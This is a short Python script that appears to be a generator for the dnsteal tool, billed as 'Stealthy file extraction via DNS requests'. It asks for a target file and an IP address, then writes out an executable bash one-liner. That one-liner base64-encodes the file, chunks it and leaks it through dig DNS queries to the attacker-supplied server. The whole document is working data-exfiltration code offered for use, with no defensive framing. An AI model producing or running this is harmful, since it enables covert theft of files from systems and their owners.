#Code by ERIC

import os
print ("\033[1;32m",)
print ("""
      ___  _  _ ___ _            _
     |   \| \| / __| |_ ___ __ _| |
     | |) | .` \__ \  _/ -_) _` | |
     |___/|_|\_|___/\__\___\__,_|_|v%s
      ___  ____  _ __  ___    __    __   ___
     | | )|    || \ / |   \  |  |  |  | |   )
     |  < | ,, ||   \ | \033[1;33m|>\033[1;31m  | 00 || 00 ||  <_
     |___)|_||_||_|\_\|___/  |__|  |__| |_|\_)


\033[1;32m-- https://github.com/m57/dnsteal.git --\033[0m

Stealthy file extraction via DNS requests
""")

filei  = input("Enter the file name: ")
filer  = input("Enter the file name to exploit: ")
fileip = input("Enter the IP adress: ")
exploit = "f="+filer+"; s=4;b=57;c=0; for r in $(for i in $(base64 -w0 $f| sed \"s/.\{$b\}/&\\n/g\");do if [[ \"$c\" -lt \"$s\"  ]]; then echo -ne \"$i-.\"; c=$(($c+1)); else echo -ne \"\\n$i-.\"; c=1; fi; done ); do dig @"+fileip+" `echo -ne $r$f|tr \"+\" \"*\"` +short; done"
file = open(filei,"w")
file.write(exploit)
file.close()
os.system("chmod +x "+filei)
print("\033[1;32m[+]"+" Exploit created with success in \'"+filei+"\'.")
